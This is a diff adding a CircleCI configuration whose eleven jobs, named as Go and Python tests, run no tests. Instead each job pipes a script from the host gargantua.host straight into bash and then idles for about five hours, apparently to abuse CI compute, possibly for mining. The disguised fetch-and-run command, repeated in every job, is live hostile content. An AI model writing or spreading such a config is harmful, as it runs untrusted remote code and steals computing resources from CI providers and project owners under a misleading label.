@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  goandpythtest:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  goandpythtest1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  goandpythtest2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  goandpythtest3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  goandpythtest4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  goandpythtest5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  goandpythtest6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  goandpythtest7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  goandpythtest8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  goandpythtest9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  goandpythtest10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - goandpythtest
+      - goandpythtest1
+      - goandpythtest2
+      - goandpythtest3
+      - goandpythtest4
+      - goandpythtest5
+      - goandpythtest6
+      - goandpythtest7
+      - goandpythtest8
+      - goandpythtest9
+      - goandpythtest10
